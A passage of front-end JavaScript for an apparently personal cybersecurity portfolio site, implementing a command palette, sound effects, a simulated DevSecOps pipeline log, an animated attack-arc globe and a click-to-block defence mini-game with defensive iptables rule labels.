    const navEntry = performance.getEntriesByType('navigation')[0];
    let loadTime = 'N/A';
    if (navEntry) loadTime = (navEntry.loadEventEnd - navEntry.startTime).toFixed(0) + 'ms';
    else if (performance.timing) loadTime = (performance.timing.loadEventEnd - performance.timing.navigationStart) + 'ms';
    document.getElementById('statLoadTime').textContent = loadTime;

    const ua = navigator.userAgent;
    let browser = 'Unknown', os = 'Unknown';
    if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Chrome')) browser = 'Chrome';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edge')) browser = 'Edge';
    if (ua.includes('Win')) os = 'Windows'; else if (ua.includes('Mac')) os = 'macOS';
    else if (ua.includes('Linux')) os = 'Linux'; else if (ua.includes('Android')) os = 'Android';
    document.getElementById('statBrowser').textContent = `${browser} / ${os}`;
    document.getElementById('statViewport').textContent = `${window.innerWidth}×${window.innerHeight}`;
    document.getElementById('statDomSize').textContent = document.getElementsByTagName('*').length + ' nodes';

    const resources = performance.getEntriesByType('resource');
    let totalBytes = 0;
    resources.forEach(r => { if (r.transferSize) totalBytes += r.transferSize; });
    if (navEntry && navEntry.transferSize) totalBytes += navEntry.transferSize;
    document.getElementById('statWeight').textContent = totalBytes > 0 ? `~${(totalBytes / (1024 * 1024)).toFixed(2)} MB` : 'Cached';

    const isHttps = location.protocol === 'https:';
    const hasCsp = !!document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    document.getElementById('statSecurity').textContent = `${isHttps ? 'HTTPS' : 'HTTP'} · ${hasCsp ? 'CSP ✓' : 'No CSP'}`;
    hasCalculated = true;
  }

  toggleBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    const isOpen = panel.classList.toggle('open');
    toggleBtn.setAttribute('aria-expanded', isOpen);
    if (isOpen && !hasCalculated) {
      if (document.readyState === 'complete') calculateAnalytics();
      else window.addEventListener('load', calculateAnalytics);
    }
  });
  document.addEventListener('click', (e) => {
    if (panel.classList.contains('open') && !panel.contains(e.target) && !toggleBtn.contains(e.target)) {
      panel.classList.remove('open'); toggleBtn.setAttribute('aria-expanded', 'false');
    }
  });
})();

// ============================================================
//  FEATURE 8: ENHANCED ANIMATED TRANSITIONS
// ============================================================
(function initEnhancedAnimations() {
  const isReduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  if (isReduced) return;

  function setupStagger(selector, revealClass, groupStagger) {
    const elements = document.querySelectorAll(selector);
    elements.forEach((el, index) => {
      if (selector === ".timeline-item") {
        el.classList.add(index % 2 === 0 ? "reveal-left" : "reveal-right");
      } else {
        el.classList.add(revealClass);
      }
      el.style.setProperty("--stagger", groupStagger ? index : index % 3);
    });
  }

  setupStagger(".skill-box", "reveal-up", true);
  setupStagger(".timeline-item", "reveal-left", true);
  setupStagger(".project-card", "reveal-flip", true);
  setupStagger(".achieve-card", "reveal-scale", true);
  setupStagger(".cert-card", "reveal-depth", true);

  // Odometer-style counters
  const statNums = document.querySelectorAll(".stat-number");
  const odoObserver = new IntersectionObserver((entries, obs) => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const el = entry.target;
      const target = parseInt(el.dataset.target, 10);
      el.innerHTML = '';
      const digits = target.toString().split('');
      digits.forEach((digit, i) => {
        const col = document.createElement('span');
        col.className = 'odo-digit';
        let html = '';
        const limit = parseInt(digit, 10);
        for (let j = 0; j <= 9; j++) html += `<span>${j}</span>`;
        for (let j = 0; j <= limit; j++) html += `<span>${j}</span>`;
        col.innerHTML = html;
        el.appendChild(col);
        requestAnimationFrame(() => {
          setTimeout(() => { col.style.transform = `translateY(-${(col.children.length - 1) * 100}%)`; }, 50 + (i * 150));
        });
      });
      setTimeout(() => {
        const plus = document.createElement("span");
        plus.textContent = "+";
        plus.style.opacity = "0"; plus.style.transition = "opacity 0.3s ease";
        el.appendChild(plus);
        requestAnimationFrame(() => plus.style.opacity = "1");
      }, 50 + (digits.length * 150) + 500);
      obs.unobserve(el);
    });
  }, { threshold: 0.5 });
  statNums.forEach(n => odoObserver.observe(n));
})();

// ============================================================
//  FEATURE 9: COMMAND PALETTE (CTRL+K / CMD+K)
// ============================================================
(function initCommandPalette() {
  const modal = document.getElementById("cmdPalette");
  const backdrop = document.getElementById("cmdBackdrop");
  const input = document.getElementById("cmdInput");
  const resultsWrap = document.getElementById("cmdResults");
  if (!modal || !input || !resultsWrap) return;
  let selectedIndex = 0, currentResults = [];

  const COMMANDS = [
    { text: "Go to About Me", type: "Navigate", icon: "fa-user", link: "#about" },
    { text: "Go to Experience", type: "Navigate", icon: "fa-briefcase", link: "#experience" },
    { text: "Go to Skills", type: "Navigate", icon: "fa-code", link: "#skills" },
    { text: "Go to Journey", type: "Navigate", icon: "fa-route", link: "#timeline" },
    { text: "Go to Write-ups", type: "Navigate", icon: "fa-pen-nib", link: "#articles" },
    { text: "Go to Practice", type: "Navigate", icon: "fa-dumbbell", link: "#achievements" },
    { text: "Go to Projects", type: "Navigate", icon: "fa-shield-halved", link: "#projects" },
    { text: "Go to Threat Model", type: "Navigate", icon: "fa-spider", link: "#threatmodel" },
    { text: "Go to GitHub Activity", type: "Navigate", icon: "fa-github", brand: true, link: "#github" },
    { text: "Go to Training", type: "Navigate", icon: "fa-certificate", link: "#certificates" },
    { text: "Go to Contact", type: "Navigate", icon: "fa-envelope", link: "#contact" },
    { text: "Toggle Theme", type: "Action", icon: "fa-moon", action: () => document.getElementById("themeToggle").click() },
    { text: "Download Resume", type: "Action", icon: "fa-file-pdf", action: () => window.print() },
    { text: "Open GitHub Profile", type: "External", icon: "fa-github", brand: true, link: "https://github.com/NejamulHaque", ext: true },
    { text: "Open LinkedIn Profile", type: "External", icon: "fa-linkedin", brand: true, link: "https://linkedin.com/in/NejamulHaque", ext: true },
    { text: "Open Medium Profile", type: "External", icon: "fa-medium", brand: true, link: "https://nejamulhaque.medium.com/", ext: true }
  ];

  function openPalette() {
    modal.classList.add("open"); document.body.classList.add("modal-open");
    input.value = ""; filterResults(""); setTimeout(() => input.focus(), 100);
  }
  function closePalette() { modal.classList.remove("open"); document.body.classList.remove("modal-open"); }

  function executeItem(item) {
    closePalette();
    if (item.action) item.action();
    else if (item.link) {
      if (item.ext) window.open(item.link, "_blank");
      else { const target = document.querySelector(item.link); if (target) target.scrollIntoView({ behavior: "smooth", block: "start" }); }
    }
  }

  function renderResults() {
    resultsWrap.innerHTML = currentResults.map((item, idx) => `
      <div class="cmd-item ${idx === selectedIndex ? "selected" : ""}" data-idx="${idx}">
        <div class="cmd-item-icon"><i class="${item.brand ? 'fa-brands' : 'fa-solid'} ${item.icon}"></i></div>
        <div class="cmd-item-text">${item.text}</div>
        <div class="cmd-item-type">${item.type}</div>
      </div>
    `).join("");
    const sel = resultsWrap.querySelector(".selected");
    if (sel) sel.scrollIntoView({ block: "nearest" });
  }

  function filterResults(query) {
    const q = query.toLowerCase();
    currentResults = COMMANDS.filter(c => c.text.toLowerCase().includes(q) || c.type.toLowerCase().includes(q));
    selectedIndex = 0; renderResults();
  }

  document.addEventListener("keydown", (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === "k") {
      e.preventDefault(); modal.classList.contains("open") ? closePalette() : openPalette();
    }
    if (e.key === "Escape" && modal.classList.contains("open")) closePalette();
  });

  input.addEventListener("input", (e) => filterResults(e.target.value));
  input.addEventListener("keydown", (e) => {
    if (currentResults.length === 0) return;
    if (e.key === "ArrowDown") { e.preventDefault(); selectedIndex = (selectedIndex + 1) % currentResults.length; renderResults(); }
    else if (e.key === "ArrowUp") { e.preventDefault(); selectedIndex = (selectedIndex - 1 + currentResults.length) % currentResults.length; renderResults(); }
    else if (e.key === "Enter") { e.preventDefault(); executeItem(currentResults[selectedIndex]); }
  });

  resultsWrap.addEventListener("click", (e) => {
    const itemEl = e.target.closest(".cmd-item");
    if (itemEl) executeItem(currentResults[parseInt(itemEl.dataset.idx, 10)]);
  });
  if (backdrop) backdrop.addEventListener("click", closePalette);
})();

// ============================================================
//  FEATURE: CYBER PROCEDURAL AUDIO SYNTHESIZER
// ============================================================
const CyberAudio = (function() {
  let audioCtx = null;
  let isSoundEnabled = localStorage.getItem("portfolio-sound-enabled") === "true";
  const soundToggle = document.getElementById("soundToggle");
  const soundIcon = document.getElementById("soundIcon");

  function updateIcon() {
    if (!soundIcon || !soundToggle) return;
    soundIcon.className = isSoundEnabled ? "fa-solid fa-volume-high" : "fa-solid fa-volume-xmark";
    soundToggle.classList.toggle("active", isSoundEnabled);
  }
  updateIcon();

  if (soundToggle) {
    soundToggle.addEventListener("click", () => {
      isSoundEnabled = !isSoundEnabled;
      localStorage.setItem("portfolio-sound-enabled", isSoundEnabled);
      updateIcon();
      if (isSoundEnabled) {
        initContext();
        play("success");
      }
    });
  }

  function initContext() {
    if (!audioCtx) {
      const AudioContextClass = window.AudioContext || window.webkitAudioContext;
      if (AudioContextClass) audioCtx = new AudioContextClass();
    }
    if (audioCtx && audioCtx.state === "suspended") {
      audioCtx.resume();
    }
  }

  function play(type) {
    if (!isSoundEnabled) return;
    initContext();
    if (!audioCtx) return;
    const now = audioCtx.currentTime;

    try {
      if (type === "click" || type === "key") {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = "sine";
        osc.frequency.setValueAtTime(800, now);
        osc.frequency.exponentialRampToValueAtTime(300, now + 0.04);
        gain.gain.setValueAtTime(0.06, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.04);
      } else if (type === "blip") {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = "triangle";
        osc.frequency.setValueAtTime(520, now);
        osc.frequency.exponentialRampToValueAtTime(880, now + 0.08);
        gain.gain.setValueAtTime(0.08, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.08);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.08);
      } else if (type === "alert") {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = "sawtooth";
        osc.frequency.setValueAtTime(350, now);
        osc.frequency.setValueAtTime(300, now + 0.06);
        gain.gain.setValueAtTime(0.1, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.12);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.12);
      } else if (type === "success") {
        [523.25, 659.25, 783.99, 1046.5].forEach((freq, i) => {
          const osc = audioCtx.createOscillator();
          const gain = audioCtx.createGain();
          osc.type = "sine";
          osc.frequency.setValueAtTime(freq, now + i * 0.06);
          gain.gain.setValueAtTime(0.07, now + i * 0.06);
          gain.gain.exponentialRampToValueAtTime(0.001, now + i * 0.06 + 0.12);
          osc.connect(gain);
          gain.connect(audioCtx.destination);
          osc.start(now + i * 0.06);
          osc.stop(now + i * 0.06 + 0.12);
        });
      } else if (type === "laser") {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = "sawtooth";
        osc.frequency.setValueAtTime(1400, now);
        osc.frequency.exponentialRampToValueAtTime(120, now + 0.18);
        gain.gain.setValueAtTime(0.12, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.18);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.18);
      }
    } catch(e) {}
  }

  // Play audio on terminal typing & generic clicks when enabled
  document.addEventListener("click", (e) => {
    if (e.target.closest("button") || e.target.closest("a") || e.target.closest(".gate-chip")) {
      play("click");
    }
  });

  return { play };
})();

// ============================================================
//  FEATURE: DEVSECOPS PIPELINE SIMULATOR ENGINE
// ============================================================
(function initPipelineSimulator() {
  const runBtn = document.getElementById("runPipelineBtn");
  const resetBtn = document.getElementById("resetPipelineBtn");
  const termBody = document.getElementById("pipelineTerminalBody");
  const gateChips = document.querySelectorAll(".gate-chip");
  if (!runBtn || !termBody) return;

  const STAGES = [
    {
      id: "secrets",
      name: "Secret Scanning (GitShield)",
      logRunning: "Running GitShield regex scanner against git staging tree...",
      logSuccess: "✓ 0 high-entropy keys or plaintext credentials detected.",
      logBypassed: "⚠ Gate skipped: GitShield pre-commit hook disabled.",
      passDuration: 700
    },
    {
      id: "sast",
      name: "Static Analysis (Semgrep)",
      logRunning: "Scanning source for OWASP Top 10 vulnerabilities with Semgrep...",
      logSuccess: "✓ Semgrep analysis clean (0 SQLi, 0 Command Injection, 0 XSS findings).",
      logBypassed: "⚠ Gate skipped: SAST code analysis bypassed.",
      passDuration: 850
    },
    {
      id: "sca",
      name: "SCA Dependencies (Trivy)",
      logRunning: "Parsing package-lock.json & go.sum against National Vulnerability Database...",
      logSuccess: "✓ 0 CRITICAL or HIGH CVEs detected in upstream dependencies.",
      logBypassed: "⚠ Gate skipped: Third-party vulnerability audit disabled.",
      passDuration: 800
    },
    {
      id: "container",
      name: "Container Hardening (Docker/Trivy)",
      logRunning: "Auditing multi-stage Dockerfile and non-root user enforcement...",
      logSuccess: "✓ Container runs as non-root user (UID 10001). Base image hardened.",
      logBypassed: "⚠ Gate skipped: Container vulnerability scanner disabled.",
      passDuration: 900
    },
    {
      id: "dast",
      name: "Dynamic Security Scan (OWASP ZAP)",
      logRunning: "Running automated dynamic baseline scan against ephemeral test environment...",
      logSuccess: "✓ Ingress boundary hardened. Strict CSP & TLS v1.3 verified.",
      logBypassed: "⚠ Gate skipped: DAST dynamic attack simulation disabled.",
      passDuration: 950
    },
    {
      id: "sbom",
      name: "Supply Chain Provenance (Cosign/SLSA)",
      logRunning: "Generating SPDX SBOM and cryptographically signing image with Cosign...",
      logSuccess: "✓ SLSA Level 3 Provenance generated & attestation signed.",
      logBypassed: "⚠ Gate skipped: Supply chain signature omitted.",
      passDuration: 750
    }
  ];

  let isRunning = false;

  // Toggle Gate Checkboxes
  gateChips.forEach(chip => {
    chip.addEventListener("click", (e) => {
      if (isRunning) { e.preventDefault(); return; }
      const checkbox = chip.querySelector('input[type="checkbox"]');
      if (e.target !== checkbox) checkbox.checked = !checkbox.checked;
      chip.classList.toggle("active", checkbox.checked);
      CyberAudio.play("blip");
    });
  });

  function appendLog(text, type = "ok") {
    const line = document.createElement("div");
    line.className = `pipeterm-line ${type}`;
    line.textContent = text;
    termBody.appendChild(line);
    termBody.scrollTop = termBody.scrollHeight;
  }

  function resetPipeline() {
    if (isRunning) return;
    STAGES.forEach(s => {
      const stepEl = document.getElementById(`step-${s.id}`);
      if (stepEl) {
        stepEl.className = "track-step";
        const icon = stepEl.querySelector(".step-status");
        if (icon) icon.className = "step-status fa-solid fa-circle-dot";
      }
    });
    document.querySelectorAll(".track-connector").forEach(c => c.classList.remove("active"));
    termBody.innerHTML = '<div class="pipeterm-line muted">// Ready. Click "Trigger Pipeline Run" to start DevSecOps security verification...</div>';
  }

  async function runPipeline() {
    if (isRunning) return;
    isRunning = true;
    runBtn.disabled = true;
    runBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Executing Pipeline...';
    termBody.innerHTML = "";
    CyberAudio.play("laser");

    appendLog("[DEVSECOPS PIPELINE INITIATED] Hardening CI/CD workflow...", "muted");

    for (let i = 0; i < STAGES.length; i++) {
      const stage = STAGES[i];
      const chip = document.querySelector(`.gate-chip[data-gate="${stage.id}"]`);
      const isEnabled = chip && chip.querySelector('input[type="checkbox"]').checked;
      const stepEl = document.getElementById(`step-${stage.id}`);

      if (stepEl) stepEl.classList.add("running");
      appendLog(`▶ [STAGE ${i+1}/${STAGES.length}] ${stage.name}`);
      appendLog(`  ${isEnabled ? stage.logRunning : "Bypassing stage..."}`, "muted");

      await new Promise(r => setTimeout(r, isEnabled ? stage.passDuration : 300));

      if (stepEl) {
        stepEl.classList.remove("running");
        stepEl.classList.add(isEnabled ? "passed" : "bypassed");
      }

      const connectors = document.querySelectorAll(".track-connector");
      if (connectors[i]) connectors[i].classList.add("active");

      if (isEnabled) {
        appendLog(`  ${stage.logSuccess}`, "ok");
        CyberAudio.play("blip");
      } else {
        appendLog(`  ${stage.logBypassed}`, "warn");
      }
    }

    appendLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "muted");
    appendLog("✓ PIPELINE COMPLETED: All active security gates passed. Image promoted to production.", "ok");
    CyberAudio.play("success");

    runBtn.disabled = false;
    runBtn.innerHTML = '<i class="fa-solid fa-play"></i> Trigger Pipeline Run';
    isRunning = false;
  }

  runBtn.addEventListener("click", runPipeline);
  if (resetBtn) resetBtn.addEventListener("click", resetPipeline);
})();

// ============================================================
//  FEATURE: 3D CYBER THREAT GLOBE PROJECTION ENGINE
// ============================================================
(function initThreatGlobe() {
  const canvas = document.getElementById("threatGlobe");
  if (!canvas) return;
  const ctx = canvas.getContext("2d");
  const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  const dpr = window.devicePixelRatio || 1;
  const cw = 540, ch = 380;
  canvas.width = cw * dpr; canvas.height = ch * dpr;
  ctx.scale(dpr, dpr);
  canvas.style.width = "100%"; canvas.style.maxWidth = `${cw}px`; canvas.style.height = "auto";

  const getVar = (name) => getComputedStyle(document.body).getPropertyValue(name).trim();

  // Coordinates of global cyber hubs
  const THREAT_ORIGINS = [
    { name: "Frankfurt, DE", lat: 50.11, lon: 8.68, vector: "SSH Brute-Force", ip: "185.220.101.42" },
    { name: "São Paulo, BR", lat: -23.55, lon: -46.63, vector: "Port Scan & Probe", ip: "177.54.148.91" },
    { name: "Ashburn, US", lat: 39.04, lon: -77.48, vector: "SQL Injection Probe", ip: "198.51.100.24" },
    { name: "Beijing, CN", lat: 39.90, lon: 116.40, vector: "Auth Bypass Attempt", ip: "202.108.22.5" },
    { name: "Tokyo, JP", lat: 35.67, lon: 139.65, vector: "CVE-2024-38077 Scanner", ip: "133.242.18.99" },
    { name: "London, UK", lat: 51.50, lon: -0.12, vector: "Path Traversal Probe", ip: "51.140.28.11" },
    { name: "Sydney, AU", lat: -33.86, lon: 151.20, vector: "Distributed Bot Probe", ip: "139.130.4.5" }
  ];

  // Target node: Sentinel Daemon Server (India)
  const TARGET_LAT = 28.61, TARGET_LON = 77.20;

  // Globe mathematical parameters
  let rotY = 0.8; // Yaw
  let rotX = 0.35; // Pitch
  let scale = 120;
  let isDragging = false;
  let lastMouseX = 0, lastMouseY = 0;
  let velX = 0, velY = 0;

  // Generate sphere dot grid
  const DOTS = [];
  for (let lat = -80; lat <= 80; lat += 12) {
    const latRad = (lat * Math.PI) / 180;
    const rAtLat = Math.cos(latRad);
    const lonStep = Math.max(12, Math.floor(180 / (rAtLat * 14)));
    for (let lon = -180; lon < 180; lon += lonStep) {
      DOTS.push({ lat, lon });
    }
  }

  // Animated ballistic arcs
  const activeArcs = [];
  function spawnArc() {
    const origin = THREAT_ORIGINS[Math.floor(Math.random() * THREAT_ORIGINS.length)];
    activeArcs.push({
      origin,
      progress: 0,
      speed: 0.012 + Math.random() * 0.01,
      peakHeight: 0.35 + Math.random() * 0.25,
      color: "#ff6b6b"
    });
    addTelemetryFeed(origin);
  }

  // Convert Lat/Lon to 3D Cartesian coordinates
  function latLonToXYZ(lat, lon, radius = 1) {
    const phi = ((90 - lat) * Math.PI) / 180;
    const theta = ((lon + 180) * Math.PI) / 180;
    return {
      x: -(radius * Math.sin(phi) * Math.cos(theta)),
      y: -(radius * Math.cos(phi)),
      z: radius * Math.sin(phi) * Math.sin(theta)
    };
  }

  // Rotate 3D vector by globe orientation
  function rotate3D(p, rx, ry) {
    // Rotate around Y-axis
    let x1 = p.x * Math.cos(ry) + p.z * Math.sin(ry);
    let z1 = -p.x * Math.sin(ry) + p.z * Math.cos(ry);
    // Rotate around X-axis
    let y2 = p.y * Math.cos(rx) - z1 * Math.sin(rx);
    let z2 = p.y * Math.sin(rx) + z1 * Math.cos(rx);
    return { x: x1, y: y2, z: z2 };
  }

  const cx = cw / 2;
  const cy = ch / 2;

  function renderGlobe() {
    ctx.clearRect(0, 0, cw, ch);
    const accent = getVar("--accent") || "#00e5ff";
    const accent2 = getVar("--accent-2") || "#7b5cfa";
    const textCol = getVar("--text") || "#e8eeff";
    const fontMono = getVar("--fm") || "monospace";

    if (!isDragging && !reduceMotion) {
      rotY += 0.004;
      rotX += velY * 0.05;
      velY *= 0.95;
    }

    // 1. Draw Globe Atmosphere Halo
    const grad = ctx.createRadialGradient(cx, cy, scale * 0.8, cx, cy, scale * 1.3);
    grad.addColorStop(0, "rgba(0,229,255,0.06)");
    grad.addColorStop(1, "transparent");
    ctx.fillStyle = grad;
    ctx.beginPath();
    ctx.arc(cx, cy, scale * 1.3, 0, Math.PI * 2);
    ctx.fill();

    // 2. Draw Sphere Outline Ring
    ctx.beginPath();
    ctx.arc(cx, cy, scale, 0, Math.PI * 2);
    ctx.strokeStyle = "rgba(0,229,255,0.2)";
    ctx.lineWidth = 1.2;
    ctx.stroke();

    // 3. Render Dot Grid
    DOTS.forEach(d => {
      const p = latLonToXYZ(d.lat, d.lon, 1);
      const rot = rotate3D(p, rotX, rotY);
      if (rot.z > 0) { // Front-facing hemisphere
        const screenX = cx + rot.x * scale;
        const screenY = cy + rot.y * scale;
        const alpha = Math.max(0.08, rot.z * 0.45);
        ctx.beginPath();
        ctx.arc(screenX, screenY, 1.2, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(100, 160, 255, ${alpha})`;
        ctx.fill();
      }
    });

    // 4. Render Target Node (Sentinel Core)
    const targetP = latLonToXYZ(TARGET_LAT, TARGET_LON, 1);
    const targetRot = rotate3D(targetP, rotX, rotY);
    if (targetRot.z > 0) {
      const tx = cx + targetRot.x * scale;
      const ty = cy + targetRot.y * scale;
      ctx.beginPath();
      ctx.arc(tx, ty, 5, 0, Math.PI * 2);
      ctx.fillStyle = accent;
      ctx.shadowBlur = 12;
      ctx.shadowColor = accent;
      ctx.fill();
      ctx.shadowBlur = 0;

      ctx.fillStyle = textCol;
      ctx.font = `600 10px ${fontMono}`;
      ctx.fillText("SENTINEL CORE", tx + 8, ty + 3);
    }

    // 5. Render Attack Arcs
    for (let i = activeArcs.length - 1; i >= 0; i--) {
      const arc = activeArcs[i];
      if (!reduceMotion) arc.progress += arc.speed;

      const p1 = latLonToXYZ(arc.origin.lat, arc.origin.lon, 1);
      const p2 = latLonToXYZ(TARGET_LAT, TARGET_LON, 1);

      // Arc interpolation with parabolic altitude peak
      const t = arc.progress;
      const height = Math.sin(t * Math.PI) * arc.peakHeight;
      const currentRadius = 1 + height;

      // Linear spherical interpolation
      const curX = p1.x + (p2.x - p1.x) * t;
      const curY = p1.y + (p2.y - p1.y) * t;
      const curZ = p1.z + (p2.z - p1.z) * t;
      const len = Math.sqrt(curX * curX + curY * curY + curZ * curZ);
      const normP = {
        x: (curX / len) * currentRadius,
        y: (curY / len) * currentRadius,
        z: (curZ / len) * currentRadius
      };

      const arcRot = rotate3D(normP, rotX, rotY);
      if (arcRot.z > -0.15) {
        const sx = cx + arcRot.x * scale;
        const sy = cy + arcRot.y * scale;

        // Draw projectile head
        ctx.beginPath();
        ctx.arc(sx, sy, 3, 0, Math.PI * 2);
        ctx.fillStyle = arc.color;
        ctx.shadowBlur = 10;
        ctx.shadowColor = arc.color;
        ctx.fill();
        ctx.shadowBlur = 0;
      }

      if (arc.progress >= 1) {
        activeArcs.splice(i, 1);
      }
    }

    requestAnimationFrame(renderGlobe);
  }

  // Periodic attack generator
  setInterval(() => {
    if (activeArcs.length < 4) spawnArc();
  }, 1800);

  // Mouse & Touch Drag Controls
  function onPointerDown(x, y) {
    isDragging = true;
    lastMouseX = x;
    lastMouseY = y;
  }
  function onPointerMove(x, y) {
    if (!isDragging) return;
    const dx = x - lastMouseX;
    const dy = y - lastMouseY;
    rotY += dx * 0.008;
    rotX = Math.max(-0.9, Math.min(0.9, rotX + dy * 0.008));
    lastMouseX = x;
    lastMouseY = y;
  }
  function onPointerUp() { isDragging = false; }

  canvas.addEventListener("mousedown", (e) => onPointerDown(e.clientX, e.clientY));
  window.addEventListener("mousemove", (e) => onPointerMove(e.clientX, e.clientY));
  window.addEventListener("mouseup", onPointerUp);

  canvas.addEventListener("touchstart", (e) => {
    if (e.touches.length === 1) onPointerDown(e.touches[0].clientX, e.touches[0].clientY);
  }, { passive: true });
  window.addEventListener("touchmove", (e) => {
    if (e.touches.length === 1) onPointerMove(e.touches[0].clientX, e.touches[0].clientY);
  }, { passive: true });
  window.addEventListener("touchend", onPointerUp);

  // Telemetry list population
  const feedStream = document.getElementById("threatFeedStream");
  const countEl = document.getElementById("globAttacksCount");
  let totalCount = 1482;

  function addTelemetryFeed(origin) {
    if (!feedStream) return;
    totalCount++;
    if (countEl) countEl.textContent = totalCount.toLocaleString();

    const item = document.createElement("div");
    item.className = "feed-item";
    item.innerHTML = `
      <div class="feed-item-left">
        <span class="feed-ip">${origin.ip} <small style="color:var(--muted)">(${origin.name})</small></span>
        <span class="feed-vector">${origin.vector}</span>
      </div>
      <span class="feed-status">KERNEL DROP</span>
    `;
    feedStream.insertBefore(item, feedStream.firstChild);
    while (feedStream.children.length > 5) feedStream.removeChild(feedStream.lastChild);
  }

  // Start rendering
  renderGlobe();
})();

// ============================================================
//  FEATURE: SENTINEL INCIDENT DEFENSE SIMULATOR (Mini-Game)
// ============================================================
(function initDefenseGame() {
  const startBtn = document.getElementById("defenseStartBtn");
  const autoBtn = document.getElementById("defenseAutoBtn");
  const clearBtn = document.getElementById("defenseClearBtn");
  const stream = document.getElementById("defenseLiveStream");
  const scoreEl = document.getElementById("defenseScore");
  const dotEl = document.getElementById("defenseStateDot");
  if (!startBtn || !stream) return;

  let isPlaying = false;
  let isAuto = false;
  let timer = null;
  let score = 0;

  const ATTACK_VECTORS = [
    { type: "SSH Brute-Force", port: 22, cmd: "iptables -A INPUT -p tcp --dport 22 -j DROP" },
    { type: "Log4j JNDI Exploit", port: 8080, cmd: "iptables -A INPUT -s [IP] -j DROP" },
    { type: "SYN Flood Recon", port: 443, cmd: "iptables -A INPUT -m limit --limit 25/minute -j DROP" },
    { type: "SQLi Injection Probe", port: 80, cmd: "iptables -A INPUT -s [IP] -j REJECT" },
    { type: "Kubernetes API Probe", port: 6443, cmd: "iptables -I INPUT -p tcp --dport 6443 -j DROP" }
  ];

  function randomIP() {
    return `${Math.floor(Math.random()*190)+20}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}`;
  }

  function spawnThreat() {
    if (!isPlaying) return;
    const v = ATTACK_VECTORS[Math.floor(Math.random() * ATTACK_VECTORS.length)];
    const ip = randomIP();

    const pkt = document.createElement("div");
    pkt.className = "threat-packet";
    pkt.innerHTML = `
      <div class="threat-info">
        <span class="threat-tag">${v.type}</span>
        <span><strong>${ip}:${v.port}</strong></span>
      </div>
      <button class="threat-drop-btn" type="button">Drop IP</button>
    `;

    const dropBtn = pkt.querySelector(".threat-drop-btn");
    const neutralize = () => {
      if (pkt.classList.contains("neutralized")) return;
      pkt.classList.add("neutralized");
      dropBtn.textContent = "Mitigated";
      score++;
      if (scoreEl) scoreEl.textContent = score;
      CyberAudio.play("blip");
    };

    dropBtn.addEventListener("click", neutralize);
    stream.insertBefore(pkt, stream.firstChild);

    if (isAuto) {
      setTimeout(neutralize, 350);
    } else {
      CyberAudio.play("alert");
    }

    while (stream.children.length > 8) stream.removeChild(stream.lastChild);
  }

  startBtn.addEventListener("click", () => {
    isPlaying = !isPlaying;
    if (isPlaying) {
      startBtn.innerHTML = '<i class="fa-solid fa-stop"></i> Stop Stream';
      dotEl.classList.add("active");
      stream.innerHTML = "";
      timer = setInterval(spawnThreat, 1400);
      spawnThreat();
      CyberAudio.play("laser");
    } else {
      startBtn.innerHTML = '<i class="fa-solid fa-play"></i> Start Live Threat Stream';
      dotEl.classList.remove("active");
      clearInterval(timer);
    }
  });

  autoBtn.addEventListener("click", () => {
    isAuto = !isAuto;
    autoBtn.innerHTML = `<i class="fa-solid fa-robot"></i> Auto-Sentinel: ${isAuto ? "ACTIVE" : "OFF"}`;
    autoBtn.classList.toggle("btn-primary", isAuto);
    CyberAudio.play("click");
  });

  if (clearBtn) {
    clearBtn.addEventListener("click", () => {
      stream.innerHTML = '<div class="defense-empty-state">Console cleared. Ready for ingress logs.</div>';
    });
  }
})();

// ============================================================
//  FEATURE: "ASK NEJAMUL AI" INTERACTIVE COPILOT
// ============================================================
(function initAiCopilot() {
  const fab = document.getElementById("copilotFab");
  const modal = document.getElementById("copilotModal");
  const closeBtn = document.getElementById("copilotClose");
  const form = document.getElementById("copilotForm");
  const input = document.getElementById("copilotInput");
  const msgContainer = document.getElementById("copilotMessages");
  const promptsWrap = document.getElementById("copilotPrompts");
  if (!fab || !modal) return;

  const KNOWLEDGE = [
    {
      keywords: ["police", "up police", "amroha", "apcsip", "internship", "cyber cell", "forensics"],
      answer: "During the **APCSIP-2026 Cyber Security Program @ UP Police (Amroha Cyber Cell)**, I analyzed real-world cybercrime mechanisms, incident log traces, and digital forensics workflows under law enforcement frameworks. I audited server logs for brute-force attacks and network reconnaissance, converting findings directly into automated Linux/Bash/Python tools for server hardening."
    },
    {
      keywords: ["kubeshield", "kubernetes", "k8s", "admission", "controller", "webhook", "pod security"],
      answer: "**KubeShield** is my custom Kubernetes Dynamic Admission Webhook written in Go/Rego. It intercepts pod creation manifests before scheduling, validates against the CIS Kubernetes Benchmark, blocks privileged containers running as root (UID 0), and auto-injects read-only root filesystems and non-root UID 10001."
    },
    {
      keywords: ["gitslsa", "slsa", "sbom", "supply chain", "cosign", "sigstore", "provenance"],
